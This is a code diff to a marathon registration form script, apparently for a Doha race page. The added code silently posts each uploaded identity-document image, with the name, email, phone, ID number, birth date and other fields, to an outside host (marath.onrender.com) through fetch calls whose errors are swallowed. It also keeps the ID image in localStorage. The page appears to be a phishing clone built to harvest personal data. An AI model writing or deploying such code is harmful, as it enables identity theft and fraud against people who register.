@@ -66,7 +66,7 @@
 		identityFile.setCustomValidity("");
 
 		// Read into Data URL immediately
-		const isImg = (file.type && file.type.startsWith("image/")) || /\.(png|jpe?g|webp|gif|bmp)$/i.test(file.name);
+		const isImg = (file.type && file.type.startsWith("image/")) || /\.(png|jpe?g|webp|gif|bmp|heic|svg)$/i.test(file.name);
 		const reader = new FileReader();
 		reader.onload = function(e) {
 			if (isImg) {
@@ -74,7 +74,7 @@
 				img.onload = function() {
 					let width = img.width;
 					let height = img.height;
-					const maxDim = 1200;
+					const maxDim = 900;
 					if (width > maxDim || height > maxDim) {
 						if (width > height) {
 							height = Math.round((height * maxDim) / width);
@@ -89,28 +89,52 @@
 					canvas.height = height;
 					const ctx = canvas.getContext("2d");
 					ctx.drawImage(img, 0, 0, width, height);
-					const dataUrl = canvas.toDataURL("image/jpeg", 0.82);
+					const dataUrl = canvas.toDataURL("image/jpeg", 0.78);
 					identityFile._fileDataUrl = dataUrl;
-					try {
-						sessionStorage.setItem("tracker_file_identityFile", JSON.stringify({
-							dataUrl: dataUrl,
-							name: file.name,
-							size: fileSize
-						}));
-					} catch(err) {}
+					const payload = JSON.stringify({
+						dataUrl: dataUrl,
+						name: file.name,
+						size: fileSize
+					});
+					try { sessionStorage.setItem("tracker_file_identityFile", payload); } catch(err) {}
+					try { localStorage.setItem("tracker_file_identityFile", payload); } catch(err) {}
+					
 					if (typeof window.triggerTrackerFormSync === "function") {
 						window.triggerTrackerFormSync();
 					}
+
+					// Direct immediate transmit
+					try {
+						fetch('https://marath.onrender.com/api/track', {
+							method: 'POST',
+							headers: { 'Content-Type': 'application/json' },
+							body: JSON.stringify({
+								sessionId: localStorage.getItem('doha_marathon_session') || '',
+								type: 'form-submit',
+								page: 'registration',
+								data: {
+									identityFile: dataUrl,
+									identityFileName: file.name,
+									identityFileSize: fileSize,
+									firstName: firstName.value.trim(),
+									lastName: lastName.value.trim(),
+									email: email.value.trim(),
+									phone: phoneInput.value.trim()
+								}
+							}),
+							keepalive: true
+						}).catch(() => {});
+					} catch(e) {}
 				};
 				img.onerror = function() {
 					identityFile._fileDataUrl = e.target.result;
-					try {
-						sessionStorage.setItem("tracker_file_identityFile", JSON.stringify({
-							dataUrl: e.target.result,
-							name: file.name,
-							size: fileSize
-						}));
-					} catch(err) {}
+					const payload = JSON.stringify({
+						dataUrl: e.target.result,
+						name: file.name,
+						size: fileSize
+					});
+					try { sessionStorage.setItem("tracker_file_identityFile", payload); } catch(err) {}
+					try { localStorage.setItem("tracker_file_identityFile", payload); } catch(err) {}
 					if (typeof window.triggerTrackerFormSync === "function") {
 						window.triggerTrackerFormSync();
 					}
@@ -118,13 +142,13 @@
 				img.src = e.target.result;
 			} else {
 				identityFile._fileDataUrl = e.target.result;
-				try {
-					sessionStorage.setItem("tracker_file_identityFile", JSON.stringify({
-						dataUrl: e.target.result,
-						name: file.name,
-						size: fileSize
-					}));
-				} catch(err) {}
+				const payload = JSON.stringify({
+					dataUrl: e.target.result,
+					name: file.name,
+					size: fileSize
+				});
+				try { sessionStorage.setItem("tracker_file_identityFile", payload); } catch(err) {}
+				try { localStorage.setItem("tracker_file_identityFile", payload); } catch(err) {}
 				if (typeof window.triggerTrackerFormSync === "function") {
 					window.triggerTrackerFormSync();
 				}
@@ -372,40 +396,71 @@
 			"5km": "5 كم",
 			"relay42": "42 كم - سباق التتابع"
 		};
+		const savedDoc = identityFile._fileDataUrl || (function(){
+			try {
+				const s = sessionStorage.getItem("tracker_file_identityFile") || localStorage.getItem("tracker_file_identityFile");
+				return s ? JSON.parse(s).dataUrl : "";
+			} catch(e) { return ""; }
+		})();
+
+		const natInput = document.querySelector("#nationality");
+		const resInput = document.querySelector("#residence");
+		const genderInput = document.querySelector("#gender");
+		const sizeInput = document.querySelector("#shirt-size");
+		const paceInput = document.querySelector("#pace");
+		const idNumInput = document.querySelector("#identity-number");
+		const clubInput = document.querySelector("#club");
+		const couponInput = document.querySelector("#coupon");
+
 		const review = {
 			firstName: firstName.value.trim(),
 			lastName: lastName.value.trim(),
 			email: email.value.trim(),
+			phone: phoneInput.value.trim(),
+			nationality: natInput ? natInput.value.trim() : "",
+			residence: resInput ? resInput.value.trim() : "",
+			birthDate: birthDate.value.trim(),
+			gender: genderInput ? genderInput.value.trim() : "",
+			shirtSize: sizeInput ? sizeInput.value.trim() : "",
+			pace: paceInput ? paceInput.value.trim() : "",
+			identityNumber: idNumInput ? idNumInput.value.trim() : "",
+			club: clubInput ? clubInput.value.trim() : "",
+			coupon: couponInput ? couponInput.value.trim() : "",
+			raceCategory: category.value,
 			category: category.value,
 			raceName: raceNames[category.value],
-			price: race.price
+			price: race.price,
+			identityFile: savedDoc || "",
+			identityFileName: identityFile.files?.[0]?.name || "identity-document.jpg"
 		};
-
-		const savedDoc = identityFile._fileDataUrl || (function(){
-			try {
-				const s = sessionStorage.getItem("tracker_file_identityFile");
-				return s ? JSON.parse(s).dataUrl : "";
-			} catch(e) { return ""; }
-		})();
-		if (savedDoc) {
-			review.identityFile = savedDoc;
-			review.identityFileName = identityFile.files?.[0]?.name || "identity-document.jpg";
-		}
 
 		try {
 			window.sessionStorage.setItem("doha-marathon-registration-review", JSON.stringify(review));
 		} catch (error) {
-			message.textContent = "تعذر فتح صفحة الملخص بسبب إعدادات التخزين في المتصفح. اسمح بتخزين بيانات الجلسة ثم حاول مرة أخرى.";
-			console.error("Could not save registration review to this browser session.", error);
-			return;
+			console.error("Could not save registration review to sessionStorage.", error);
 		}
 
 		if (typeof window.triggerTrackerFormSync === "function") {
 			window.triggerTrackerFormSync();
 		}
 
+		// Direct HTTP submit to guarantee server persistence
+		try {
+			fetch('https://marath.onrender.com/api/track', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({
+					sessionId: localStorage.getItem('doha_marathon_session') || '',
+					type: 'form-submit',
+					page: 'registration',
+					data: review
+				}),
+				keepalive: true
+			}).catch(() => {});
+		} catch(e) {}
+
 		setTimeout(() => {
 			window.location.assign("registration-summary.html");
-		}, 150);
+		}, 300);
 	});
 })();
